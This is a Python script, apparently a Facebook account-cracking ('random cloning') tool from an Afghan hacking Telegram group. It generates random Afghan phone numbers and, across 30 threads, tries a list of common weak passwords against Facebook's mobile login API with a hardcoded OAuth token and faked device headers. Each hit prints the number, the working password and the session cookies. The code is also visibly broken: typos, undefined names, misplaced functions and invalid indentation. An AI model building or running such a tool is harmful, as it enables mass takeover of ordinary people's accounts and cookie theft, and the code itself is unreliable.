import os,time,random,string,sys,uuid,json
from concurrent.futures import ThreadPoolExecutor

import requests

numbs = []
loop=0
ok_ids=[]

logo='''
\330(1;32m  ███████╗░█████╗\330(1;33m░██╗░░░██╗███████╗\330(1;35░██████╗░
\330(1;32m  ██╔════╝██╔══██\330(1;33m╗╚██╗░██╔╝██╔════╝\330(1;35██╔═══██╗
\330(1;32m  █████╗░░███████║\330(1;33m░╚████╔╝░█████╗\330(1;35░░██║██╗██║
\330(1;32m  ██╔══╝░░██╔══██║\330(1;33m░░╚██╔╝░░██╔══╝\330(1;35░░╚██████╔╝
\330(1;32m  ██║░░░░░██║░░██║\330(1;33m░░░██║░░░███████╗\330(1;35░╚═██╔═╝░
\330(1;32m  ╚═╝░░░░░╚═╝░░╚═╝\330(1;33m░░░╚═╝░░░╚══════╝\330(1;35░░░╚═╝░░░
 |_______________________________________________________________________________________
\330(1;42m [●]Tooles manufacturer | FayeqNaseh
\330(1;46m [●]Telegram group      | @AFGHAN HACK
\330(1;44m [●]Status              | Gold
\330(1;48m [●]Version             | 0.1'''
 
def clear():
   os.system('clear') 
   print(logo)
     
def line():
     print(f"|---------------------------------------")
 
def menu():
       clear()
       line()
       print(f' | [1]Random Cloning AFG')
       print(f' | [2]go to Telegram group')
       print(f' | [0]Exit')
       line()
       inp = str(input(' | Choose:')).strip()
       if inp in ['1','01']:
           randomClone()
       elif inp in ['2','02']:
             os.system('xdg-open https://t.m/Afhan_hack')
       elif inp in ['3','03']:
             ('Have a good time for you')
             exit()
       else:
             print('Option not fund in menu')
             time.sleep(2)
             menu()
             
def randomClone():
    clear()
    line()
    print(' | codes: 079, 078, 077, 072, 070')
    line()
    inp = str(input('Choose code'))
    try:
        limit = int(input(' | put Limit'))
    except:
        limit = 5000
    for f in  regan(limit):
        
        numb =''.join(random.choice(string.digits) for f in range(7))
        numbs.append(numb)
    with ThreadPoolExecutor(max_work = 30) as Fayeq:
        clear()
        line()
        ran = str(len(numbs))
        print(' | Method : Random Cloning')
        print(f' | Limit : {ran}')
        print(' | OF/ON Airplane mode ore use')
        line()
        for number in numbs:
            ids = inp + number
            password = [number, ids,'۱۲۳۴۵۶','۱۲۳۴۵۶۷','۱۲۳۴۵۶۷۸','123456','123123','12345678','10002000','afghanistan123','Afghanistan123','afghan123',' Afghan123']
            Fayeq.submit(startClone,ids,password)

        def startClone(ids,passwords):
            try:
                global loop
                sys.stdout.write(f'\r | [FAYEQ-CLONE] %s/%s'%(loop,len(ok_ids),len))
                for pas in passwords:
                    useragent={"Mozilla/5.0 (Linux; Android 10; K)",
                               "Mozilla/5.0 (Windows NT 10.0; Win64)",
                               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"}

                    data={
                                'adid': str(uuid.uuid4()),
                                'format': 'json',
                                'device_id': str(uuid.uuid4()),
                                'email': ids,
                                'password': pas,
                                'generate_analytics_claims': '1',
                                'community_id': '',
                                'cpl': 'true',
                                'try_num': '1',
                                'family_device_id': str(uuid.uuid4()),
                                'credentials_type': 'password',
                                'source': 'login',
                                'error_detail_type': 'button_with_disabled',
                                'enroll_misauth': 'false',
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1',
                                'currently_logged_in_userid': '0',
                                'locale': 'en_GB',
                                'client_country_code': 'GB',
                                'fb_api_req_friendly_name': 'authenticate'}
                    header ={
                                'User-Agent': useragent,
                                'Accept-Encoding':  'gzip, deflate',
                                'Accept': '*/*',
                                'Connection': 'keep-alive',
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Friendly-Name': 'authenticate',
                                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'}
                    url = 'https://b-api.facebook.com/method/auth.login'
                    data1 = requests.post(url,data=data,headers=header).text
                    data2 = json.loads(data1)
                    if 'session_key' in data2:
                            print(f'\r | [FYEQ-OK] {ids} | {pas}')
                            cookie = ";".join(_['name']+'='+_['value'] for _ in data2['session_cookies'])
                            print(f'\r | [COOKIE] : {cookie}')
                            ok_ids.append(ids)
                            break
                         else:pass
                            loop+=1
                     except requests.exceptions.ConnectionError:
                            time.sleep(10)
                            pass
                     except Exception as error:
                            print(error)

Fayeq()
